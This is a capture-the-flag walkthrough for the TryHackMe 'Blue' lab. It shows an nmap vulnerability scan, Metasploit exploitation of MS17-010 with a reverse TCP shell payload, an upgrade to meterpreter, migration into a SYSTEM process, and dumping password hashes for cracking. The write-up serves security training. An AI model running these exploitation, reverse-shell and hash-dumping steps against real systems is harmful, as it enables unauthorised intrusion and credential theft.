![image](https://github.com/user-attachments/assets/3771b37e-8ec0-42b7-9f58-333254073a5e)

# Blue
- You're my boy BLUE!
- https://tryhackme.com/room/blue

## Recon
### Nmap scan
    nmap -sV --script vuln -v 10.10.209.236
![image](https://github.com/user-attachments/assets/bb635019-1413-4015-be4d-72af3fb19641)

- A crucial step is scanning with the Vuln script category, which led us to find CVE-2017–0143. CVE-2017–0143 This information is available on Exploit-DB.

## Gain Access
### Start metasploit
    msfconsole
    search ms17-010
    use 0
    options
    set RHOSTS <IP>
    set payload windows/x64/shell/reverse_tcp
    run
## Escalate
background using ```CTRL-Z```
```use post/multi/manage/shell_to_meterpreter```
```options```
```sessions```
```set sessions <session_id>```
```set LHOST tun0```
```run```
    Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command ‘shell’ and run ‘whoami’. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

Run the ps command to view the running processes on the machine.

    List all of the processes running via the ‘ps’ command. Just because we are system doesn’t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
```ps```
migrate <PID> #recommend spoolsv.exe printer service because it is reliable and NT Authority\System

## Cracking
    hashdump
- Crack using crackstation.net

## Find Flags
- Common places are C:\ | documents | desktop
- search -f flag2.txt
